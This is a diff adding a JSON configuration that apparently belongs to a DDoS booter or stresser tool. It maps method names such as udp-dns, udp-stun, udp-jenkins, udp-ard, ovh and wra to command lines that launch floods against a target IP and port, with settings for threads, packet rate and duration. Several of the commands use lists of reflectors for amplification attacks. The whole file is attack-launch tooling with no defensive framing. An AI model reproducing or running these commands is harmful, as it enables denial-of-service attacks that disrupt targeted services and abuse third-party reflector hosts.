@@ -1,0 +1,9 @@
+{
+    "udp-dns":"./dns $target/32 $port lists/dns.list $threads $pps $time",
+    "udp-stun":"./stun $target $port lists/stun.list $threads $pps $time",
+    "udp-odin":"./odin $target $port lists/odin.list $threads $pps $time",
+    "udp-jenkins":"./jenkins $target/32 $port lists/jenkins.list $threads $pps $time",
+    "udp-ard":"./ard $target $port lists/ard.list $threads $pps $time",
+    "ovh":"./ovh $target $port 556 $threads $pps $time",
+    "wra":"./wra $target $port $threads $pps $time"
+}
